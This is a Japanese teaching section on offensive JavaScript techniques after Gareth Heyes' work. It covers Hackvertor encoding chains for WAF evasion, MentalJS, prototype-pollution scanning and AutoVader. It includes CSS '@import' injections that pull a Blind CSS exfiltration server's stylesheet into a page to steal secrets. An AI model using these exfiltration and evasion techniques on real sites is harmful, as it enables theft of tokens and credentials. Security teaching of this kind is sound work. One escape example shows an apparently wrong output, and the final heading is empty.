# ハッカーのためのJavaScript — エンコード連鎖・JSサンドボックス・DOM系脆弱性の実践基盤

> **この節で分かること**
> - なぜ攻撃者が「多重エンコード」でフィルタやWAFを回避するのか、その設計上の理由を説明できる
> - Hackvertor のタグ構文とネスト（入れ子）を使って、ペイロードのエンコード連鎖を自分で組み立てられる
> - MentalJS が「JSを安全な部分集合に制限する」仕組みと、なぜJSパーサの理解が攻撃に直結するのかを説明できる
> - プロトタイプ汚染（Prototype Pollution）を「観測可能な副作用」でどう検出するかを説明できる
> - Blind CSS Exfiltration が `@import` と属性セレクタで未知ページを盗む仕組みを説明できる
> - AutoVader のスキャン分類を使って、DOM系脆弱性（source/sink/gadget/message/redirect）を体系的に探せるようになる

**元資料**: https://leanpub.com/javascriptforhackers ／ https://garethheyes.co.uk/ （**原典は取得できず二次情報ベース**。担当2URLは執筆環境のegressポリシーで完全遮断されたため、同一著者 Gareth Heyes 本人の公開GitHub（hackvertor）から逐語取得した代替一次資料を根拠とする）
**関連する節**: DOM XSS／プロトタイプ汚染／CSP の各節

---

## 1. この節の立ち位置 — 「攻撃者のようにJavaScriptを読む」とは

### 書籍「JavaScript for Hackers」とは
「JavaScript for Hackers」とは、PortSwigger の研究者 Gareth Heyes が Leanpub で刊行した書籍のこと。攻撃者視点でJavaScriptの言語仕様・パーサ・DOM・ブラウザ挙動を理解し、XSSベクタの作成・短縮・難読化、フィルタ／WAF／CSPの回避を学ぶ実践書という位置づけである。

Gareth Heyes は XSS、DOM clobbering、mutation XSS（mXSS）、プロトタイプ汚染（クライアント・サーバ両方）、CSPバイパス、JS短縮・難読化の第一人者だ。書籍とブログ garethheyes.co.uk（旧 thespanner.co.uk）は、これらの研究の集大成にあたる。

### この節が根拠にしている資料の注意点
本節の担当2URL（Leanpub書籍ページと著者ブログ）は、執筆環境のネットワーク制限（egressポリシー）で1文字も取得できなかった。そこで、**同じ著者本人が公開しているGitHubリポジトリ（hackvertor 名義）**から、書籍と同じテーマの一次資料を逐語で取得し、それを根拠にしている。

つまりこの節は「書籍そのものの引用」ではなく、「同一著者による同テーマの公開ツールとドキュメント」に基づく。断定的な逐語引用ではない点に注意してほしい。原典（書籍・ブログ本文）は、読者自身が各自の環境で開いて確認する必要がある。

> ### 📌 ここは自分で開いて読んでください
> **資料**: JavaScript for Hackers（Gareth Heyes, Leanpub刊） — https://leanpub.com/javascriptforhackers
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: leanpub.com がegressポリシーで遮断＝curl で CONNECT 403、加えて有料本文はそもそも購入者向けで WebFetch では読めない）。以下の記述は同一著者の公開GitHub資料と一般知識にもとづく要約である。
> **読みどころ**:
> 1. Table of Contents（目次）で正確な章題・章数・節構成を確認し、本節の「想定トピック」を実章題に置き換える
> 2. Book description で対象読者・前提知識・扱う脆弱性クラスの範囲・PortSwigger research との関係を読む
> 3. 無料サンプル（Read free sample）で、JS言語仕様から攻撃へどう橋渡しするか、短縮／難読化の導入例を確認する
> 4. 著者情報・foreword で、本書が Heyes のどの研究に基づくかを確認する
> **代替手段**: 無料サンプル（Read free sample）と目次はログイン不要で閲覧可。実体ツールは著者GitHub（github.com/hackvertor）で無料公開されている。

> ### 📌 ここは自分で開いて読んでください
> **資料**: Gareth Heyes 個人サイト／ブログ — https://garethheyes.co.uk/
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の制限＝egressポリシーで403、記事が転載される portswigger.net/research や旧ブログ thespanner.co.uk も同様に遮断）。以下の記述は目次・二次情報・著者公開資料の断片にもとづく要約である。
> **読みどころ**:
> 1. 記事一覧（Blog/Research）で各記事の正確なタイトル・公開日・要約を確認する
> 2. DOM clobbering／mutation XSS／プロトタイプ汚染／CSPバイパスの各解説記事の本文とPoCコード（最重要）を読む
> 3. サイト上で動くインタラクティブなPoC／デモをブラウザで実際に動かして挙動を観察する（静的取得では欠落する）
> **代替手段**: 記事の多くは PortSwigger research（portswigger.net/research）にも掲載される。本節§5・§6で扱う Blind CSS Exfiltration とプロトタイプ汚染は、対応するGitHubリポジトリで実体を確認できる。

---

## 2. なぜ多重エンコードで回避できるのか — 設計意図

### エンコードとは何か
エンコード（encoding）とは、あるデータを別の表現形式に変換すること。たとえば `<script>` という文字列を、意味は同じまま `%3Cscript%3E`（URLエンコード）や `&lt;script&gt;`（HTMLエンティティ）という見た目の違う文字列に置き換える操作を指す。

### 攻撃者が突く「解釈のズレ」
Webアプリはデータを何段階もの処理系（プロキシ→WAF→アプリ→ブラウザのHTMLパーサ→JSエンジン→CSSパーサ）に通す。各段階が「どこまでデコードするか」は少しずつ違う。

攻撃者はこの**解釈のズレ**を突く。WAF（Web Application Firewall、通信を検査して攻撃を弾く防御機構）が `<script>` という平文を弾いても、`\x3cscript\x3e`（16進エスケープ）のように別表現にしておけば、WAFは危険と気づかず素通しし、最終的にブラウザだけがデコードして実行する、という状況を作れる。

### なぜ「入れ子（ネスト）」が効くのか
1段のエンコードだけならフィルタも対応済みのことが多い。そこで複数のエンコードを入れ子にする。たとえば「gzip圧縮 → Base64 → 16進エスケープ」のように重ねると、途中のどの層のフィルタも元のペイロードを認識できなくなる。この「エンコード連鎖」を機械的に組む道具が、次に見る Hackvertor である。

---

## 3. Hackvertor — タグベース変換エンジン

出典: https://github.com/hackvertor/hackvertor および wiki（Tag-Reference / Tag-Syntax）

### Hackvertor とは
Hackvertor とは、Gareth Heyes が作った Java製のタグベース変換ツールのこと。Burp Suite（Web診断の定番プロキシツール）の拡張として動く。エンコード・デコード・ハッシュ・暗号化・文字列変換を、単純な「タグ」で書けるようにし、それらを無制限にネスト（入れ子）できるのが特徴だ。現行版は v2.2.67（2026年9月）。

書籍が扱う「エンコーディングの入れ子による難読化・WAF回避」を、そのまま実装したツールと考えてよい。

### タグの基本構文
タグは `<@タグ名>中身</@タグ名>` の形をとる。`@` 記号がHackvertorタグの識別子で、続くタグ名（下の例では base64）が処理内容を表す。

```
<@tag_name>content</@tag_name>
<@base64>Hello World</@base64>
→ SGVsbG8gV29ybGQ=
<@uppercase>hello</@uppercase>
→ HELLO
<@md5>password</@md5>
→ 5f4dcc3b5aa765d61d8327deb882cf99
```

### 引数付きタグ
タグは引数もとれる。引数は3種類 — 文字列（ダブル／シングルクォート）、真偽値（true, false）、数値（16進数を含む）である。文字列はシングルクォートで囲み、数値はクォート不要。

```
<@replace('old','new')>old text</@replace>
→ new text
<@rotN(13)>Hello</@rotN>
→ Uryyb
<@substring(0,5)>Hello World</@substring>
→ Hello
```

引数を持たず、その場で値を生成する「自己終了タグ」もある。

```
<@get_variable1/>
<@timestamp/>
<@uuid/>
```

### ネスト（入れ子）— 最内から最外へ
ネストは無制限で、複数タグでエンコード／デコードを連鎖できる。Hackvertor は**最も内側のタグから最も外側のタグへ**順に変換する。

```
<@urlencode_all><@base64>payload</@base64></@urlencode_all>
```

処理順は次のとおり。

1. `payload` → Base64 encode → `cGF5bG9hZA==`
2. `cGF5bG9hZA==` → URL encode all → `%63%47%46%35%62%47%39%68%5a%41%3d%3d`

さらに多段に重ねられる。

```
<@hex_escapes><@base64><@gzip_compress>data</@gzip_compress></@base64></@hex_escapes>
```

処理は「1. data を gzip圧縮 → 2. Base64 encode → 3. 各文字を16進エスケープ」の順。これが§2で説明した「エンコード連鎖でフィルタを層ごとにすり抜ける」実装そのものだ。

### 変数
値を変数に保存し、後から参照できる。`false` はセッション限定、`true` は永続。

```
<@set_variable1(false)>my_value</@set_variable1>
<@get_variable1/>
```

```
<@set_variable1(false)>secret</@set_variable1>
Key: <@get_variable1/>
Hash: <@md5><@get_variable1/></@md5>
→ Key: secret / Hash: 5ebe2294ecd0e0f08eab7690d2a6ee69
```

### コンテキストタグ
処理中のHTTPリクエストの一部を差し込むタグ。リクエスト内容に応じて動的に変換したいときに使う。

```
<@context_request/>       全HTTPリクエスト
<@context_body/>          リクエストボディ
<@context_url('$host')/>  URL要素（$protocol,$host,$path等）
<@context_header('name')/> ヘッダ値
<@context_param('name')/>  パラメータ値
```

### 正規表現引数
正規表現（文字列パターンを表す記法）で、変換対象の一部だけを指定できる。

```
<@dec2hex('(\\d+)')>The number is 255</@dec2hex>
→ The number is ff
<@hex2dec('([a-f0-9]+)')>Value: ff</@hex2dec>
```

### Tag Expressions（条件付き変換）
v2.2.65 以降で追加された機能で、`check` タグと論理演算子により条件付き変換ができる。

```
<@check(tag_name,'exec_key')>input</@check>
<@check('isJson','exec_key')>{"a":1}</@check> && <@base64>foo</@base64>
→ Zm9v
```

- 予測タグ: `<@isJson>`（入力がJSONオブジェクト／配列で true）、`<@isNumeric>`（符号・小数・指数付き10進数で true）
- 演算子: `A && B`（Aが真ならB、偽ならA）／`A || B`（Aが真ならA、偽ならB）／`!A`（反転）
- Falsy（偽とみなす）= 出力が空、文字列 `false`、またはエラーを投げたオペランド
- `&&` は `||` より優先。短絡評価あり。boolean結果は何も描画しない
- タグ名にアンダースコアを含む場合のみクォートが必要（`<@check('is_admin','exec_key')>` / `<@check(isJson,'exec_key')>`）
- `check` タグが無ければ `&&` `||` `!` はリテラル文字として扱われる（既存ペイロード互換）

### Burp統合とその他の機能
Hackvertor は Burp と深く統合される。Proxy／Repeater／Intruder のコンテキストメニュー、メッセージエディタタブ、Intruderペイロードプロセッサ、HTTPハンドラによる自動タグ処理などから変換エンジンを呼べる。ほかに次の機能がある。

- Jigsaw Mode: タグをドラッグ&ドロップで組む
- 20以上のタグカテゴリ（Encoding / Decoding / Hashing / Encryption / String / Math / Compression 他）
- カスタムタグ（Python(Jython) / JavaScript(GraalVM) / Java(BeanShell) / Groovy）
- Tag Automator による自動化、AIによるカスタムタグ生成

---

## 4. Hackvertor タグ・リファレンス（攻撃で使う主要タグ一覧）

出典: hackvertor wiki / Tag-Reference。攻撃で頻出するのは、ペイロードを別表現に置き換えるエンコード系と、それを戻すデコード系だ。以下は逐語の一覧を再構成したもの。

### エンコード — Base系

| Tag | 説明 | 例 |
|-----|------|----|
| `base64` | Base64 encode | `<@base64>Hello</@base64>` → `SGVsbG8=` |
| `base64url` | URL-safe Base64 | `<@base64url>Hello!</@base64url>` → `SGVsbG8h` |
| `base32` | Base32 encode | `<@base32>Hello</@base32>` → `JBSWY3DP` |
| `base58` | Base58 encode | `<@base58>Hello</@base58>` → `9Ajdvzr` |

### エンコード — URL系

| Tag | 説明 | 例 |
|-----|------|----|
| `urlencode` | 標準URLエンコード | `<@urlencode>Hello World!</@urlencode>` → `Hello+World%21` |
| `urlencode_all` | 全文字をエンコード | `<@urlencode_all>ABC</@urlencode_all>` → `%41%42%43` |
| `urlencode_not_plus` | 空白を+にしないURLエンコード | `<@urlencode_not_plus>a b</@urlencode_not_plus>` → `a%20b` |
| `burp_urlencode` | Burp式URLエンコード | `<@burp_urlencode>test</@burp_urlencode>` |

### エンコード — HTML系

| Tag | 説明 | 例 |
|-----|------|----|
| `html_entities` | HTMLエンティティ化 | `<@html_entities><script></@html_entities>` → `&lt;script&gt;` |
| `html5_entities` | HTML5名前付きエンティティ | `<@html5_entities>text</@html5_entities>` |
| `hex_entities` | 16進HTMLエンティティ | `<@hex_entities>ABC</@hex_entities>` → `&#x41;&#x42;&#x43;` |
| `dec_entities` | 10進HTMLエンティティ | `<@dec_entities>ABC</@dec_entities>` → `&#65;&#66;&#67;` |

### エンコード — Hex系

| Tag | 説明 | 例 |
|-----|------|----|
| `hex` | 16進エンコード | `<@hex>ABC</@hex>` → `414243` |
| `ascii2hex` | 区切り付き16進化 | `<@ascii2hex(' ')>ABC</@ascii2hex>` → `41 42 43` |
| `sql_hex` | SQLの16進形式 | `<@sql_hex>test</@sql_hex>` |

### エンコード — エスケープシーケンス系

| Tag | 説明 | 例 |
|-----|------|----|
| `hex_escapes` | \xNN 形式 | `<@hex_escapes>A</@hex_escapes>` → `\x41` |
| `unicode_escapes` | \uNNNN 形式 | `<@unicode_escapes>A</@unicode_escapes>` → `A` |
| `octal_escapes` | \NNN 形式 | `<@octal_escapes>A</@octal_escapes>` → `\101` |
| `css_escapes` | CSS \NNNNNN 形式 | `<@css_escapes>A</@css_escapes>` → `\000041` |

### エンコード — その他（難読化で重要）

| Tag | 説明 | 例 |
|-----|------|----|
| `utf7` | 除外パターン付きUTF-7 | `<@utf7('[A-Za-z0-9]')>Hello!</@utf7>` → `Hello+ACE-` |
| `quoted_printable` | Quoted-printable | `<@quoted_printable>test=</@quoted_printable>` |
| `js_string` | JS文字列エスケープ | `<@js_string>Hello"World</@js_string>` → `Hello\"World` |
| `json_escape` | JSON文字列エスケープ | `<@json_escape>Hello"World</@json_escape>` → `Hello\"World` |
| `to_charcode` | 文字コード列に変換 | `<@to_charcode>ABC</@to_charcode>` |
| `php_chr` | PHP chr() 形式 | `<@php_chr>test</@php_chr>` |
| `php_non_alpha` | PHP非英数字化 | `<@php_non_alpha>code</@php_non_alpha>` |
| `powershell_encode` | PowerShellエンコード | `<@powershell_encode>command</@powershell_encode>` |

### デコード（多くは `d_` 接頭辞）

| Tag | 説明 | 例 |
|-----|------|----|
| `d_base64` | Base64デコード | `<@d_base64>SGVsbG8=</@d_base64>` → `Hello` |
| `d_url` | URLデコード | `<@d_url>Hello%20World</@d_url>` → `Hello World` |
| `d_html_entities` | HTMLエンティティ復号 | `<@d_html_entities>&lt;script&gt;</@d_html_entities>` → `<script>` |
| `d_utf7` | UTF-7デコード | `<@d_utf7>+AKM-</@d_utf7>` → `£` |
| `hex2ascii` | 16進→ASCII | `<@hex2ascii>414243</@hex2ascii>` → `ABC` |
| `d_css_escapes` | CSSエスケープ復号 | `<@d_css_escapes>\000041</@d_css_escapes>` → `A` |
| `auto_decode` | 自動検出してデコード | |
| `auto_decode_no_decrypt` | 復号を試みない自動デコード | |

（`d_base64url` `d_base32` `d_base58` `d_html5_entities` `d_js_string` `json_unescape` `d_octal_escapes` `d_quoted_printable` なども同様に用意されている。）

### ハッシュ・HMAC・暗号
攻撃・診断の文脈では、既知値のハッシュ照合や、暗号化されたトークンの解析に使う。

- **Hash**: `md2` `md4` `md5`（`<@md5>test</@md5>` → `098f6bcd4621d373cade4e832627b4f6`）／`sha1`（→ `a94a8fe5ccb19ba61c4c0873d391e987982fbbd3`）／`sha224` `sha256` `sha384` `sha512`／`sha3` 系／`ripemd` 系 `whirlpool` `tiger` `gost3411` `sm3`／Skein系（`skein_256_128` ほか多数）
- **HMAC**: `hmac_md5` `hmac_sha1` `hmac_sha224` `hmac_sha256` `hmac_sha384` `hmac_sha512`（引数=secret。例 `<@hmac_sha256('key')>message</@hmac_sha256>`）
- **暗号**: `aes_encrypt`/`aes_decrypt`（引数 key, transformation, IV）、`xor`/`xor_decrypt`/`xor_getkey`、`rotN`（シーザー暗号 `<@rotN(13)>Hello</@rotN>` → `Uryyb`）、`atbash_encrypt`/`atbash_decrypt`（`hello` → `svool`）、`substitution` `affine` `rail_fence` などの古典暗号

AES の例:

```
<@aes_encrypt('16bytesecretkey!','AES/CBC/PKCS5Padding','16bytesiv1234567')>plaintext</@aes_encrypt>
```

- **暗号解析（Cryptanalysis）**: `is_like_english`（英語らしさスコア）、`index_of_coincidence`（IoC計算）、`guess_key_length`（Vigenèreキー長推定）

### 文字列操作

| Tag | 引数 | 説明 | 例 |
|-----|------|------|----|
| `reverse` | - | 文字列反転 | `<@reverse>Hello</@reverse>` → `olleH` |
| `length` | - | 文字数 | `<@length>Hello</@length>` → `5` |
| `substring` | start, length | 部分文字列 | `<@substring(0,5)>Hello World</@substring>` → `Hello` |
| `replace` | search, replace | 置換 | `<@replace('o','0')>Hello</@replace>` → `Hell0` |
| `regex_replace` | pattern, replace | 正規表現置換 | `<@regex_replace('[0-9]','X')>abc123</@regex_replace>` → `abcXXX` |
| `find` | pattern | マッチ検索 | `<@find('[0-9]+')>abc123def</@find>` |
| `repeat` | count | 繰り返し | `<@repeat(3)>A</@repeat>` → `AAA` |
| `from_charcode` | - | 文字コード→文字列 | `<@from_charcode>65,66,67</@from_charcode>` → `ABC` |
| `json2form` | - | JSON→フォームデータ | `<@json2form>{"a":"1","b":"2"}</@json2form>` → `a=1&b=2` |

大小変換（`uppercase` `lowercase` `capitalise` `uncapitalise`）や空白系（`space` `newline` `remove_output`）もある。

### 難読化との関係
XSS／インジェクションのペイロードを、`hex_escapes` `unicode_escapes` `octal_escapes` `dec_entities` `hex_entities` `utf7` `to_charcode` `from_charcode` などで**多重エンコード・文字コード化・エスケープシーケンス化**し、ネスト連鎖でWAFやフィルタを回避する。これが書籍・ブログの中心テーマであり、Hackvertor はその実装だ。

---

## 5. MentalJS — JSパーサ＆サンドボックス

出典: https://github.com/hackvertor/MentalJS

### MentalJS とは
MentalJS とは、Gareth Heyes が作ったJavaScriptのパーサ兼サンドボックスのこと。README の逐語では次のとおり。

> MentalJS is a JavaScript parser and sandbox. It whitelists JavaScript code by adding a "$" suffix to variables and accessors.

つまり、変数とアクセサ（プロパティ参照）に「`$`」接尾辞を付けることで、コードを**ホワイトリスト化**（許可したものだけ通す方式）する。JSを字句・構文解析したうえで、安全な部分集合だけを許すサンドボックス（隔離実行環境）である。

### 使い方（逐語）

```javascript
var js = MentalJS();
js.parse({
    code:'1+1',
    result:function(result){ 
      alert(result) 
    }
});
```

### なぜパーサの理解が攻撃に直結するのか
サンドボックスやサニタイザ（危険な入力を無害化する処理）を破るには、「JSパーサがどこで意味を取り違えるか」を知る必要がある。〔補足〕JSのトークナイザ／AST（抽象構文木）の挙動 — 自動セミコロン挿入、`/` が除算か正規表現リテラルかの曖昧性、テンプレートリテラル、コメントの扱い — を突く難読化は、この書籍・ブログの核心テーマである。MentalJS は「攻撃者がパーサの気持ちを理解して短縮・難読化ベクタを作る」思考を、防御側の実装として体現している。

---

## 6. Blind CSS Exfiltration — CSSだけでデータを盗む

出典: https://github.com/hackvertor/blind-css-exfiltration

### どういう攻撃か
Blind CSS Exfiltration とは、CSSしか注入できない状況で、ページ上の秘密（CSRFトークンやパスワードマネージャの自動入力値など）を盗み出す手法のこと。README は「Exfiltrate unknown web pages（未知のWebページを窃取する）」と表現する。

〔補足〕CSSの属性セレクタ `[attr^="a"]{background:url(...)}` は「値が a で始まる属性を持つ要素の背景を外部URLから読み込む」という指定だ。背景URLが読み込まれたかどうかで「値の先頭文字が a だった」と分かる。これを1文字ずつ試して、秘密の値を段階的に絞り込む。1文字ずつ盲目的に当てていくので「blind」と呼ぶ。

### 仕組みと使い方（逐語）
exfiltrator（窃取サーバ）を動かすには、ソースを取得して node で実行する。既定で localhost:5001 で起動する。

```
node css-exfiltrator-server.js
```

窃取を開始するには、被害ページに `@import` で窃取サーバのスタイルを読み込ませる。`@import` とは、CSS内から別のスタイルシートを読み込むディレクティブ。

```html
<style>
@import 'http://localhost:5001/start';    
</style>
```

PortSwigger のデモラボ（1IPにつき1回のみ窃取可能）では次のようになる。

```html
<style>
@import 'https://portswigger-labs.net/blind-css-exfiltration/start';    
</style>
```

`@import` で外部スタイルを読み込ませ、窃取サーバが動的にセレクタを生成して段階的に文字を絞り込むのが「blind」たる所以だ。仕組みの詳細はブログ記事「Blind CSS Exfiltration」に記載されている。

> ### 📌 ここは自分で開いて読んでください
> **資料**: Blind CSS Exfiltration（PortSwigger research） — https://portswigger.net/research/blind-css-exfiltration
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: portswigger.net がegressポリシーで遮断）。以下の記述はGitHubリポジトリのREADME逐語と一般知識にもとづく要約である。
> **読みどころ**:
> 1. 属性セレクタで1文字ずつ絞り込む具体的アルゴリズム（先頭一致 `^=` の連鎖）
> 2. `@import` を使って複数ラウンドの窃取を成立させる同期の仕組み
> 3. 防御側の観点（CSSインジェクションを許さない出力エスケープ、`@import` を許さないCSP）
> **代替手段**: 実体コード `css-exfiltrator-server.js` は github.com/hackvertor/blind-css-exfiltration で無料で読める。

### どう守るか
CSSの注入を許さないことが第一。ユーザー入力を `<style>` や `style` 属性へそのまま出さない。加えて、CSPで `style-src` を絞り、外部スタイルの `@import` や `url()` の読み込み先を制限する。

---

## 7. プロトタイプ汚染を「観測可能な副作用」で検出する

出典: https://github.com/hackvertor/server-side-prototype-pollution

### プロトタイプ汚染とは
プロトタイプ汚染（Prototype Pollution）とは、JavaScriptの全オブジェクトが共有する大元 `Object.prototype` に、攻撃者がプロパティを注入してしまう脆弱性のこと。`__proto__` や `constructor.prototype` を経由し、ドット記法（`__proto__.x`）や角括弧記法（`__proto__[x]`）で汚染する。汚染されると、無関係なコードが「注入されたプロパティ」を拾ってしまい、権限昇格やコード実行につながる。

### 検出ツールの位置づけ
この Burp拡張（v2021.9以降が必要）は、サーバサイドのプロトタイプ汚染を検出する。手法は Heyes の講演「server side prototype pollution」に基づく。レート制限したい場合は Distribute Damage 拡張を併用する。ビルドは次のとおり。

```
Linux:   ./gradlew build fatjar
Windows: gradlew.bat build fatjar
出力:    build/libs/server-side-prototype-pollution-all.jar
```

### スキャンオプション（逐語）
どこに、どの記法で汚染を試すかで分かれている。

| オプション | 内容 |
|-----------|------|
| Body scan | JSONボディを各手法でスキャン |
| Body dot scan | ドット記法でスキャン（例 `__proto__.x`） |
| Body square scan | 角括弧記法でスキャン（例 `__proto__[x]`） |
| Param scan | クエリパラメータ等の中のJSONをスキャン（元リクエストに既存JSONが必要） |
| Param dot scan | クエリパラメータ内JSONをドット記法でスキャン |
| Param square scan | クエリパラメータ内JSONを角括弧記法でスキャン |
| Add js property scan | `constructor` 等のクエリパラメータを追加し漏洩するJSコードを発見 |
| JS property param scan | `constructor` 等の名前のパラメータを操作し漏洩JSコードを発見 |
| Async body scan | `--inspect` フラグを使い非同期に検出 |
| Async param scan | 同上をクエリパラメータ等で実施 |
| Full scan | 全手法で検出を試みる |

### 検出テクニック — なぜ「副作用」で分かるのか
サーバ内部のプロトタイプ汚染は、直接は見えない（=blind）。そこで、汚染が成立したときに起こる**観測可能な副作用**で判定する。逐語のテクニック名と、その観測点は次のとおり。

| テクニック | 何を観測するか |
|-----------|---------------|
| JSON spaces | 応答のJSON整形（空白の入り方）の乱れ |
| Async | 非同期挙動の変化 |
| Status | HTTPステータスコードの変化 |
| Options | HTTP OPTIONS応答の変化 |
| Blitz | （集中的な汚染試行による検出） |
| Exposed headers | `Access-Control-Expose-Headers` 等の変化 |
| Reflection | 注入値が応答に反射するか |
| Non reflected property | 反射しないプロパティによる検出 |

この「注入 → 観測可能な副作用で成立を確認する」という考え方は、クライアント側・サーバ側どちらのプロトタイプ汚染にも通じる実践知だ。

### どう守るか
`__proto__` や `constructor`／`prototype` をキーに使う入力を拒否する。オブジェクトのマージや動的なプロパティ代入で、危険なキーをブロックリスト／許可リストで弾く。`Object.freeze(Object.prototype)` で大元を凍結する、`Map` を使ってプレーンオブジェクトを避ける、なども有効だ。

---

## 8. AutoVader — DOM系脆弱性ハンティングの体系的チェックリスト

出典: https://github.com/hackvertor/auto-vader

### AutoVader とは
AutoVader とは、Burp Suite の DOM Invader（DOM系脆弱性を見つける機能）と Playwright Java（ブラウザ自動化ライブラリ）を統合し、DOMベース脆弱性を自動発見する Burp拡張のこと。要件は Burp Suite Professional（DOM Invaderに必須）と DOM Invader拡張。Target／Proxy History／Repeater で右クリックし、コンテキストメニューから各スキャンを実行する。

このスキャン分類そのものが、DOM系脆弱性を「何を探すか」で整理した優れたチェックリストになっている。

### スキャン種別（逐語） — 探索対象の分類
DOM系脆弱性は「source（入力元）→ sink（危険な出力先）→ gadget（悪用の踏み台）→ message（通信）→ redirect（遷移）」の観点で分けられる。

| スキャン種別 | 探索対象 |
|-------------|---------|
| Open DOM Invader | DOM Invader設定済みブラウザを開き手動テスト |
| Scan all GET params | 全クエリパラメータにcanary（追跡用の目印値）を注入し、URL入力由来のDOM脆弱性を検出 |
| Scan all GET params for gadgets | 設定したHTMLタグ／属性にcanaryを注入し、URL入力由来のDOMガジェットを検出 |
| Scan all POST params | 全POSTパラメータにcanary注入 |
| Scan web messages | postMessage脆弱性をテスト（オリジン偽装、メッセージ注入、危険なメッセージハンドラ特定） |
| Inject into all sources | 全sourceにペイロード注入し、各種入力ベクタでDOM XSSをテスト |
| Inject into all sources & click everything | 上記＋クリックイベント発火（イベントハンドラ内脆弱性の発見） |
| Scan for client side prototype pollution | クエリ文字列／ハッシュ／JSON入力でプロトタイプ汚染を検出、自動チェックで確認 |
| Scan for client side prototype pollution gadgets | 汚染で悪用可能なガジェットを発見、危険なプロパティ代入を特定 |
| Intercept client side redirect | クライアントサイドリダイレクトにブレークポイントを置き、open redirect を特定 |

### 設定（逐語）
DOM Invaderへのパス上書き／Burp Chromiumへのパス上書き／Payload（canaryに付与するカスタムペイロード）／HTML tags to scan（ガジェット用の走査タグ）／Attributes to scan（走査属性）／Delay／Always open devtools／**Remove CSP**（DOM Invaderを正しく動かすためCSPヘッダを除去、既定で有効）／Headless／Auto run from Repeater・Intruder・other extensions（`$canary` プレースホルダが必要）。

`Remove CSP` が既定で有効な点は、CSPが動的解析を妨げるという実務上の問題を端的に示している。

### 動作原理（逐語）
1. Playwright で DOM Invader拡張入りの headless Chromium を起動
2. スキャン種別に応じ DOM Invader設定を自動構成
3. 適切なペイロード付きURLへ遷移
4. DOM Invader の検出をコールバックで捕捉し Burp issue として報告
5. 重複排除

技術基盤は Playwright Java（ブラウザ自動化）、DOM Invader（脆弱性検出）、Burp Montoya API（拡張統合）。

---

## 9. 周辺ツール群（同一著者の関連技術）

書籍・ブログのテーマの周辺で、同じ著者が公開しているツール。READMEからの要約。

| ツール | 内容 |
|-------|------|
| clickbandit（github.com/hackvertor/clickbandit） | JavaScript製のクリックジャッキングPoCジェネレータ。〔補足〕透明iframe＋オーバーレイでユーザ操作を奪う攻撃のPoCを自動生成 |
| visualfuzzer（github.com/hackvertor/visualfuzzer） | Zalgo文字（結合文字を多重付与した崩れ文字）を見つけるNodeJS製ビジュアルファザー。〔補足〕Unicode正規化・結合文字・描画崩れを突く入力探索。mutation XSSに通じる |
| taborator | Collaboratorクライアントをタブに表示しOOB検出を効率化するBurp拡張。Repeaterで右クリック→Taborator |
| shadow-repeater | Repeaterのペイロード変種をAIで自動生成・送信し、応答差分から弱点（path traversal, SQLi, XSS等）を探す。既定で5回目の送信時に起動 |
| repeat-strike（Repeater Strike） | AIでRepeaterの入出力から正規表現を生成し、proxy historyに適用してIDOR等を横展開検出 |
| document-my-pentest | テスト内容をAIが理解し自動ドキュメント化。Organizerへ自動送信可 |
| speedy | ChromeのRSVPスピードリーダ拡張（100〜1000wpm、ORP強調）。MIT |
| feedworm | DevToolsパネルで動くRSS/Atomリーダ拡張。`offscreen` 権限で安全にパース、全データはローカル保存 |
| amplify-the-hacker | SteelCon 2025講演「Amplify the hacker: Offensive AI plugin development」の資料集 |

著者の連絡先（amplify-the-hacker より逐語）: サイト https://garethheyes.co.uk ／ 旧ブログ https://thespanner.co.uk ／ X https://x.com/garethheyes ／ LinkedIn https://www.linkedin.com/in/gareth-heyes-25a62b2/ ／ BlueSky https://bsky.app/profile/garethheyes.co.uk ／ Mastodon https://infosec.exchange/@gaz。

---

## 10. 〔補足〕書籍が扱うと考えられる主要トピック

以下は原典（書籍・ブログ本文）が取得できなかったため、一般に知られている著者の研究テーマの整理である。断定的な逐語引用ではなく、章番号・章題は原典で確認すること。

| テーマ | 概要 |
|-------|------|
| 攻撃者視点のJS基礎 | 型変換・暗黙の変換・グローバルオブジェクト・実行コンテキスト |
| 短縮JavaScript | 最短のalert実現、`eval`/`Function`、`location`代入、バッククォート呼び出し等のコードゴルフ |
| コメント・正規表現による難読化 | `/* */`・行コメント、regexリテラルと除算の曖昧性、`RegExp`、`String.raw` |
| DOM clobbering | `id`/`name`属性でグローバル変数やプロパティを上書きし、`window.x` などを攻撃者制御下に置く |
| mutation XSS（mXSS） | `innerHTML` の再パースでサニタイザ後にHTMLが変異し、無害な入力が実行可能に変わる |
| プロトタイプ汚染 | `__proto__`/`constructor.prototype` 汚染とガジェットチェーン（§7が対応） |
| CSPバイパス | `unsafe-inline`、nonce再利用、JSONP、script gadget、`base-uri` 未設定、strict-dynamicの穴、ポリシー注入 |

これらの「観測可能な副作用による検出」「source→sink→gadget のモデル化」は、本節§4・§7・§8で実際に取得できた代替一次資料で裏付けられている。教科書としては、それらを一次的な根拠として扱うのが安全だ。

---

## 手を動かす

1. Burp Suite を用意し、BApp Store から **Hackvertor** をインストールする（Extensions → BApp Store → Hackvertor → Install）。
2. Hackvertor のメインタブを開き、入力欄に `Hello World` と打つ。文字を選択し、右クリック → Hackvertor → Encode → `base64` を選ぶと `<@base64>Hello World</@base64>` が生成され、`SGVsbG8gV29ybGQ=` に変換されることを確認する。
3. 次に手打ちで多重ネストを試す。入力欄に `<@urlencode_all><@base64>payload</@base64></@urlencode_all>` と書き、出力が `%63%47%46%35%62%47%39%68%5a%41%3d%3d` になることを確認する（最内→最外の順に処理される）。
4. `<@md5>test</@md5>` を打ち、`098f6bcd4621d373cade4e832627b4f6` が出ることを確認する。既知値のハッシュ照合に使える感覚をつかむ。
5. 自分で立てた検証環境（意図的に脆弱なアプリ）で、Repeater 上のパラメータを選んで右クリック → Hackvertor でエンコードし、フィルタを通るかを観察する。**必ず自分の環境かバグバウンティ許可範囲でのみ行う**。
6. Blind CSS Exfiltration を試すには、リポジトリを clone し `node css-exfiltrator-server.js` を実行。localhost:5001 が起動したら、自分で立てた検証ページに `<style>@import 'http://localhost:5001/start';</style>` を注入し、窃取サーバのログに文字が復元されていく様子を観察する。
7. DOM系の探索は、Burp Professional で DOM Invader を有効化し、AutoVader を入れて Proxy History の項目を右クリック → 各スキャン（Scan all GET params、Scan web messages、Scan for client side prototype pollution など）を順に走らせ、Burp issue にどう報告されるかを見る。

## つまずきポイント

